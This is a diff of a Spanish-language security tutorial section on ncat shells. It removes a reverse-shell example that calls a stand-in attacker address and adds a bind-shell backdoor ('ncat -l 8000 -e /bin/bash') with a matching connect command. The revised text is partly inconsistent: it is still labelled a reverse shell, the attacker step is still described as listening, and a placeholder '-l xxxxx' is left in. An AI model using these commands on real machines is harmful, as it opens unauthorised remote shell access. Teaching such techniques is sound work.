@@ -86,30 +86,35 @@ Recomendación: Ver Exploring bash Reverse Shell ➡ https://www.youtube.com/wat
 **Nota:** Es interesante apreciar los diferentes promopts de las dos shells reversas.
 
 #### 1.3 Ejemplo con ncat
-El comando ncat es una versión mejorada y más segura de Netcat, incluida en la suite de herramientas Nmap.
+El comando ncat es una versión mejorada y más segura de Netcat, incluida en la suite de herramientas Nmap. El comando ncat o nc, también se pueden utilizar para crear puertas traseras en nuestros sistemas. La puerta se crearía de la siguiente manera:
 
-- En el Servidor de Ataque (Escucha): En el "servidor de ataque" debemos configurar ncat para que escuche en un puerto específico. Esto se hace para esperar una conexión entrante desde la máquina objetivo.
+- En la máquina atacante: Configurar ncat para que escuche en un puerto específico. Esto se hace para esperar una conexión entrante desde la máquina objetivo.
 ```
-ncat -lnvp 4444
+ncat 192.168.0.200 8000
 ```
-Explicación de los parámetros:
--l indica a ncat que escuche conexiones entrantes.
--n le dice a ncat que no resuelva los nombres de host, lo que acelera el proceso.
--v activa el modo verboso, lo que significa que mostrará más detalles sobre la conexión.
--p 4444 especifica el puerto en el que ncat estará escuchando. Puedes elegir otro puerto si lo prefieres.
 ![](capturas/shell-reversa-ncat-mv-atacante.png)
-  
-- En la Máquina Víctima: Necesitamos ejecutar un comando que intente conectarse al servidor de ataque y establezca la shell reversa. La elección del comando puede depender del sistema operativo de la máquina objetivo y de las herramientas disponibles.
+
+- En la Máquina Víctima: 
 ```
-ncat -e /bin/bash IP_DEL_SERVIDOR_DE_ATAQUE 4444
+ncat -l 8000 -e /bin/bash
 ```
 Explicación de los parámetros:
 -e /bin/bash le dice a ncat que ejecute /bin/bash y envíe su entrada/salida a través de la conexión de red, estableciendo así una shell reversa.
+-l xxxxx
 ![](capturas/shell-reversa-ncat-mv-victima.png)
+
+- Establecido los dos puntos anteriores ya podemos desde la máquina atacante usar la shell reversa:
+![](capturas/shell-reversa-ncat-mv-atacante-2.png)
+
 
 Debemos de tener en cuenta:
 - Transmitir una shell sin cifrar a través de la red puede ser peligroso y exponer información sensible. La herramienta ncat ofrece la opción de establecer conexiones cifradas utilizando el parámetro --ssl para mejorar la seguridad.
 - La herramienta ncap debe estar instalada tanto en la máquina víctima como en la atacante.
+
+
+
+
+
 
 
 
